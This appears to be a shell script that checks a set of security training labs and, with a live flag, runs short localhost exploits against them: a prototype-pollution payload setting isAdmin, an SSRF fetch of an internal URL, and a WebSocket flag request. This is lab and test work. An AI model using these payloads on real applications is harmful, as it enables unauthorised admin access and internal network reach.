#!/usr/bin/env bash
# Verify modern 2026 teaching labs (structure + optional live probes).
# Usage:
#   ./verify_modern_labs.sh              # structure only
#   ./verify_modern_labs.sh --live       # also curl/ws against localhost
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
LIVE=0
[[ "${1:-}" == "--live" ]] && LIVE=1
fail=0

check_file() {
  if [[ -f "$1" ]]; then
    echo "[+] present $1"
  else
    echo "[-] missing $1"
    fail=1
  fi
}

echo "=== structure ==="
for path in \
  "$ROOT/poc-examples/prototype-pollution/lab/Dockerfile" \
  "$ROOT/poc-examples/prototype-pollution/lab/server.js" \
  "$ROOT/poc-examples/prototype-pollution/lab/README.md" \
  "$ROOT/poc-examples/ssrf-chaining/lab/Dockerfile" \
  "$ROOT/poc-examples/ssrf-chaining/lab/app/app.py" \
  "$ROOT/poc-examples/ssrf-chaining/lab/README.md" \
  "$ROOT/poc-examples/websocket-injection/lab/Dockerfile" \
  "$ROOT/poc-examples/websocket-injection/lab/server.js" \
  "$ROOT/poc-examples/websocket-injection/lab/README.md"
do
  check_file "$path"
done

for needle in "prototype-pollution" "8114" "ssrf" "8115" "websocket" "8116"; do
  if grep -q "$needle" "$ROOT/labs/docker-compose.yml" \
    && grep -q "$needle" "$ROOT/labs/README.md" \
    && grep -q "$needle" "$ROOT/labs/labctl.sh"; then
    echo "[+] indexed $needle"
  else
    echo "[-] not fully indexed: $needle"
    fail=1
  fi
done

# Prior catalog not gutted
for needle in "file-upload" "8101" "dotnet-json" "8113"; do
  if grep -q "$needle" "$ROOT/labs/README.md"; then
    echo "[+] prior lab still listed: $needle"
  else
    echo "[-] prior lab missing from catalog: $needle"
    fail=1
  fi
done

if [[ "$LIVE" -eq 1 ]]; then
  echo "=== live probes ==="
  for url in \
    http://127.0.0.1:8114/health \
    http://127.0.0.1:8115/health \
    http://127.0.0.1:8116/health
  do
    code=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 2 --max-time 5 "$url" || echo 000)
    if [[ "$code" == "200" ]]; then
      echo "[+] $url → $code"
    else
      echo "[-] $url → $code (start with: cd labs && ./labctl.sh up prototype-pollution ssrf websocket)"
      fail=1
    fi
  done

  admin=$(curl -s -X POST http://127.0.0.1:8114/api/prefs \
    -H 'Content-Type: application/json' \
    -d '{"__proto__":{"isAdmin":true}}' >/dev/null
    curl -s http://127.0.0.1:8114/admin || true)
  if echo "$admin" | grep -q 'OSWE{prototype_pollution_lab_flag}'; then
    echo "[+] PP exploit flag"
  else
    echo "[-] PP exploit failed: $admin"
    fail=1
  fi

  ssrf=$(curl -s -X POST http://127.0.0.1:8115/fetch \
    -d 'url=http://127.0.0.1:9999/internal/flag' || true)
  if echo "$ssrf" | grep -q 'OSWE{ssrf_chaining_lab_flag}'; then
    echo "[+] SSRF exploit flag"
  else
    echo "[-] SSRF exploit failed: $ssrf"
    fail=1
  fi

  if command -v python3 >/dev/null; then
    if python3 -c "from websocket import create_connection" 2>/dev/null; then
      py=python3
    elif [[ -x "${SCRATCH:-}/venv/bin/python" ]]; then
      py="${SCRATCH}/venv/bin/python"
    else
      py=""
    fi
    if [[ -n "$py" ]]; then
      out=$($py - <<'PY'
import json
from websocket import create_connection
ws = create_connection("ws://127.0.0.1:8116/ws", timeout=5)
ws.recv()
ws.send(json.dumps({"type": "flag"}))
print(ws.recv())
ws.close()
PY
)
      if echo "$out" | grep -q 'OSWE{websocket_injection_lab_flag}'; then
        echo "[+] WebSocket exploit flag"
      else
        echo "[-] WebSocket exploit failed: $out"
        fail=1
      fi
    else
      echo "[!] skip WS live (install websocket-client); health already checked"
    fi
  fi
fi

if [[ "$fail" -ne 0 ]]; then
  echo "FAIL"
  exit 1
fi
echo "OK"
exit 0
